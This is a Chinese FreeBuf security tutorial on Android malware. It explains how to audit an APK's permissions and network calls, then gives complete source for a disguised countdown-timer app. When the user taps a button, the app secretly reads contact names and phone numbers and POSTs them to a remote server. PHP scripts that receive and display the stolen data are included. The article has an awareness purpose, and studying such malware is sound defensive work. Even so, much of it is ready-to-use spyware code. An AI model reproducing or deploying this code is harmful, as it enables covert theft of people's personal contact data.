@@ -1,0 +1,508 @@
+*** 本文作者：烟波渺渺正愁予，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
+## 0×00前言
+
+ **最近收到比较多的垃圾信息，想起了恶意软件这种东西可能泄露信息，于是便写下此文。**  
+
+## 0×01实验环境
+
+基础环境：win10，Android studio 3，jd-gui，apktool，dex2jar
+
+应用 ：MyTimer(APP)， php网页(接收信息)
+
+虚拟机：
+
+![image.png](https://image.3001.net/images/20180428/1524893134153.png!small)
+
+## 0×02实验准备
+
+在ubuntu(192.168.159.128)服务器上搭建好php环境，然后准备三个文件：newfile.txt（用来存储接收到的信息），readinfo.php(用来展示接收到的信息)，receive.php(用来接收信息)。这里使用的是虚拟机，实际中需要外网能访问的服务器，这样手机应用才能正常连接到服务器。  
+
+![image.png](https://image.3001.net/images/20180428/15248931998649.png!small)
+
+**readinfo.php**
+
+    
+    
+     <?php
+    
+    $file_path ="/var/www/readcontacts/newfile.txt";
+    
+    if(file_exists($file_path)){
+    
+    $str = file_get_contents($file_path);
+    
+    $str =str_replace("\r\n","<br />",$str);
+    
+    $str=explode(',',$str);
+    
+    echo"<pre>";print_r($str);echo "<pre>";
+    
+    }
+    
+    ?>
+
+ **receive.php**
+
+    
+    
+     <?php
+    
+    $info= $_POST["info"];
+    
+    $myfile =fopen("/var/www/readcontacts/newfile.txt", "w") ordie("Unable to open file!");
+    
+    fwrite($myfile, $info);
+    
+    fclose($myfile);
+    
+    ?>
+
+## 0×03实验步骤
+
+在模拟器中安装并启动MyTimer(此时服务器上的newfile.txt文件为空)，从功能上看这只是一个计时器。如下图所示
+
+![image.png](https://image.3001.net/images/20180428/15248933831785.png!small)
+
+我们在最上面的输入框中输入时间，点击“设置时间”按钮，会在下面显示到计时的时间。如下图所示  
+
+![image.png](https://image.3001.net/images/20180428/15248935276325.png!small)
+
+当我们点击“开始计时”按钮时，应用开始倒计时，如下图所示：
+
+![image.png](https://image.3001.net/images/20180428/15248935739355.png!small)
+
+在使用此应用时，我们并未发现什么异常情况，现在我们把视角切换到ubuntu服务器上，这个时候就会发现newfile.txt中多出了一些内容，然后我们访问readinfo.php，就可以看到手机上的联系人信息
+
+![image.png](https://image.3001.net/images/20180428/15248936473182.png!small)![image.png](https://image.3001.net/images/20180428/15248936836424.png!small)
+
+## 0×03原理剖析与软件实现
+
+ **一、原理剖析**
+
+通常我们要分析一个应用是否有恶意功能，可以进行以下几步操作：
+
+0、使用apktool得到AdroidManifest.xml，使用dex2jar得到应用源码
+
+1、审查应用程序使用的权限
+
+![image.png](https://image.3001.net/images/20180428/15248938249053.png!small)  
+
+通过查看我们发现这个应用申请了网络访问权限，联系人读写权限，访问帐户列表权限，但是我们从应用的功能来看明显是不需要这几个功能的，列入嫌疑名单，开始下一步审查。
+
+2、审查应用程序使用的进程间通信机制
+
+![image.png](https://image.3001.net/images/20180428/15248938746805.png!small)  
+
+这里我们只发现了一个调用主Activity的机制，本步检查安全。
+
+3、分析源码中开放的端口、共享/传输的数据，以及网络连接
+
+![image.png](https://image.3001.net/images/20180428/15248939052498.png!small)  
+
+通过分析源码，我们发现代码里有一段发起了网络请求，应用程序在向一个IP为192.168.159.128地址发送信息
+
+![image.png](https://image.3001.net/images/20180428/15248939626676.png!small)
+
+继续阅读源码，我们发现代码里有读取联系人的操作，同时将读取结果拼接到URL参数中向远程服务器发送。
+
+综合分析可以发现，本应用程序在运行时，当用户点击设置时间按钮时会读取用户通讯录联系人并通过网络方式发送给远程服务器，可以定义为木马程序。
+
+ **二、软件实现  
+**
+上面是当遇到一个APP时的审查操作，为了更加深入的了解恶意软件的工作原理，此处我们编写一个简单恶意APP(也就是上面我们分析的APP)，仅读取联系人信息。在实际中黑客可以会读取短信，读取位置信息跟踪定位一个人等。
+
+ **MainActivity主要内容**
+
+    
+    
+     public class MainActivity extendsAppCompatActivity implements OnClickListener {
+    
+    private EditText inputtime;
+    
+    private Button getTime;
+    
+    private Button startTime;
+    
+    private Button stopTime;
+    
+    private TextView time;
+    
+    private int remaindertime = 0;
+    
+    private Timer timer = null;
+    
+    private TimerTask timerTask = null;
+    
+    private String[] contacts = null;
+    
+    @Override
+    
+    protected void onCreate(Bundle savedInstanceState) {
+    
+    super.onCreate(savedInstanceState);
+    
+    setContentView(R.layout.activity_main);
+    
+    initviews();
+    
+    setOnclick();
+    
+    }
+    
+    private void setOnclick() {
+    
+    getTime.setOnClickListener(this);
+    
+    startTime.setOnClickListener(this);
+    
+    stopTime.setOnClickListener(this);
+    
+    }
+    
+    private void initviews() {
+    
+    inputtime = (EditText) findViewById(R.id.inputtime);
+    
+    getTime = (Button) findViewById(R.id.gettime);
+    
+    startTime = (Button) findViewById(R.id.starttime);
+    
+    stopTime = (Button)findViewById(R.id.stoptime);
+    
+    time = (TextView) findViewById(R.id.time);
+    
+    }
+    
+    @Override
+    
+    public void onClick(View v) {
+    
+    switch (v.getId()) {
+    
+    case R.id.gettime:
+    
+    time.setText(inputtime.getText().toString());
+    
+    remaindertime =Integer.parseInt(inputtime.getText().toString());
+    
+    printinfo();
+    
+    break;
+    
+    case R.id.starttime:
+    
+    startTime();
+    
+    break;
+    
+    case R.id.stoptime:
+    
+    stopTime();
+    
+    break;
+    
+    }
+    
+    }
+    
+    private Handler mHandler = new Handler() {
+    
+    public void handleMessage(android.os.Message msg) {
+    
+    time.setText(msg.arg1 + "");
+    
+    startTime();
+    
+    }
+    
+    };
+    
+    private void startTime() {
+    
+    if (timer == null) {
+    
+    timer = new Timer();
+    
+    }
+    
+    timerTask = new TimerTask() {
+    
+    @Override
+    
+    public void run() {
+    
+    if (remaindertime > 0) {
+    
+    remaindertime--;
+    
+    Message message =Message.obtain();
+    
+    message.arg1 =remaindertime;
+    
+    mHandler.sendMessage(message);
+    
+    } else {
+    
+    stopTime();
+    
+    }
+    
+    }
+    
+    };
+    
+    timer.schedule(timerTask, 1000);
+    
+    }
+    
+    private void stopTime() {
+    
+    if (timer != null)
+    
+    timer.cancel();
+    
+    }
+    
+    privatevoid printinfo() {
+    
+    contacts = getContacts();
+    
+    if (contacts != null || (contacts == null && contacts.length !=0)) {
+    
+    new Thread(new Runnable() {
+    
+    @Override
+    
+    public void run() {
+    
+    sendContacts();
+    
+    }
+    
+    }).start();
+    
+    }
+    
+    }
+    
+    public void sendContacts() {
+    
+    String target ="<http://192.168.159.128/readcontacts/receive.php>";
+    
+    URL url;
+    
+    try {
+    
+    url = new URL(target);
+    
+    HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
+    
+    urlConn.setRequestMethod("POST");
+    
+    urlConn.setDoInput(true);
+    
+    urlConn.setDoOutput(true);
+    
+    urlConn.setUseCaches(false);
+    
+    urlConn.setInstanceFollowRedirects(true);
+    
+    urlConn.setRequestProperty("Content-Type",
+    
+    "application/x-www-form-urlencoded");
+    
+    String info = "";
+    
+    for (String item : contacts) {
+    
+    info += item + ",";
+    
+    }
+    
+    DataOutputStream out = new DataOutputStream(urlConn.getOutputStream());
+    
+    String param = "info=" + URLEncoder.encode(info,"utf-8");
+    
+    out.writeBytes(param);
+    
+    out.flush();
+    
+    out.close();
+    
+    if (urlConn.getResponseCode() == HttpURLConnection.HTTP_OK) {
+    
+    urlConn.disconnect();
+    
+    }
+    
+    } catch (MalformedURLException e) {
+    
+    e.printStackTrace();
+    
+    } catch (IOException e) {
+    
+    e.printStackTrace();
+    
+    }
+    
+    }
+    
+    private String[] getContacts() {
+    
+    Uri uri = ContactsContract.Contacts.CONTENT_URI;
+    
+    String[] projection = new String[]{
+    
+    ContactsContract.Contacts._ID,
+    
+    ContactsContract.Contacts.DISPLAY_NAME
+    
+    };
+    
+    Cursor cursor = this.getContentResolver().query(uri, projection, null,null, null);
+    
+    String[] arr = new String[cursor.getCount()];
+    
+    int i = 0;
+    
+    if (cursor != null && cursor.moveToFirst()) {
+    
+    do {
+    
+    Long id = cursor.getLong(0);
+    
+    String name =cursor.getString(1);
+    
+    String[] phoneProjection = newString[]{
+    
+    ContactsContract.CommonDataKinds.Phone.NUMBER
+    
+    };
+    
+    arr[i] = id + " |name:" + name;
+    
+    Cursor phonesCusor =this.getContentResolver().query(
+    
+    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+    
+    phoneProjection,
+    
+    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
+    
+    null,
+    
+    null);
+    
+    if (phonesCusor != null&& phonesCusor.moveToFirst()) {
+    
+    do {
+    
+    String num =phonesCusor.getString(0);
+    
+    arr[i] += " |phonenum:" + num;
+    
+    } while(phonesCusor.moveToNext());
+    
+    } 
+    
+    i++;
+    
+    } while (cursor.moveToNext());
+    
+    }
+    
+    return arr;
+    
+    }
+    
+    }
+
+ **在 AndroidManifest.xml添加如下配置**
+
+    
+    
+    <uses-permissionandroid:name="android.permission.INTERNET"/>
+    
+    <uses-permissionandroid:name="android.permission.WRITE_CONTACTS"/>
+    
+    <uses-permissionandroid:name="android.permission.READ_CONTACTS"/>
+    
+    <uses-permissionandroid:name="android.permission.GET_ACCOUNTS"/>
+
+ **Avtivity_main.xml布局文件**  
+
+    
+    
+    <LinearLayoutxmlns:android="<http://schemas.android.com/apk/res/android>"
+    
+    xmlns:tools="<http://schemas.android.com/tools>"
+    
+    android:layout_width="match_parent"
+    
+    android:orientation="vertical"
+    
+    android:layout_height="match_parent" >
+    
+    <EditText
+    
+    android:id="@+id/inputtime"
+    
+    android:layout_width="fill_parent"
+    
+    android:layout_height="wrap_content"
+    
+    android:ems="10" >
+    
+    <requestFocus />
+    
+    </EditText>
+    
+    <Button
+    
+    android:id="@+id/gettime"
+    
+    android:layout_width="wrap_content"
+    
+    android:layout_height="wrap_content"
+    
+    android:text="设置时间" />
+    
+    <TextView
+    
+    android:id="@+id/time"
+    
+    android:layout_width="wrap_content"
+    
+    android:layout_height="wrap_content"
+    
+    />
+    
+    <Button
+    
+    android:id="@+id/starttime"
+    
+    android:layout_width="wrap_content"
+    
+    android:layout_height="wrap_content"
+    
+    android:text="开始计时" />
+    
+    <Button
+    
+    android:id="@+id/stoptime"
+    
+    android:layout_width="wrap_content"
+    
+    android:layout_height="wrap_content"
+    
+    android:text="停止计时" />
+    
+    </LinearLayout>
+
+## 0×05 写在最后
+
+上面的程序只是演示了读取并发送联系人，黑客往往还会读取位置信息，读取短信，读取浏览器历史信息等。所以大家平时在安装APP时需要谨慎，在授予权限时也应该遵循最小权限原则，能不给的权限就不给。希望此文能帮助大家更好的理解恶意软件工作原理，帮助大家更好的防范恶意软件，相信大家也都是遵纪守法的好公民，学习只是为了防身，嗯。
+
+ *** 本文作者：烟波渺渺正愁予，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
